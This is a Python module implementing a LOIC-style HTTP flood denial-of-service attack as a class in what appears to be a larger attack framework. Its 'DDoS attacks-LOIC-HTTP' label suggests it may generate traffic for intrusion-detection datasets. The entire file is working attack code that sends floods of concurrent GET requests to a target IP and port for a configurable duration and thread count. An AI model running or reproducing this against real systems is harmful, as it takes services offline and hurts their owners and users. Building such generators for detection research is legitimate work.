"""LOIC HTTP DDoS attack implementation"""

import asyncio
import aiohttp
import logging
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class DDosLOICHTTP(BaseAttack):
    """LOIC HTTP flood attack"""
    
    def get_attack_type(self) -> str:
        return "DDoS attacks-LOIC-HTTP"
    
    def get_default_port(self) -> int:
        return 80
    
    async def _http_flood(self, session, url):
        """Send HTTP GET request"""
        try:
            async with session.get(url, timeout=5) as response:
                await response.read()
                self.packets_sent += 1
        except Exception:
            pass
    
    async def _execute_attack(self):
        """Execute LOIC HTTP attack"""
        port = self.target_port or self.get_default_port()
        duration = self.parameters.get('duration', 300)
        threads = self.parameters.get('threads', 100)
        
        url = f"http://{self.target_ip}:{port}/"
        
        logger.info(f"LOIC-HTTP: Flooding {url} with {threads} threads")
        
        connector = aiohttp.TCPConnector(limit=threads)
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = asyncio.get_event_loop().time()
            
            while (asyncio.get_event_loop().time() - start_time) < duration:
                tasks = [self._http_flood(session, url) for _ in range(threads)]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if self.packets_sent % 5000 == 0:
                    logger.info(f"LOIC-HTTP: Sent {self.packets_sent} requests")
        
        logger.info(f"LOIC-HTTP: Attack complete. Total: {self.packets_sent} requests")

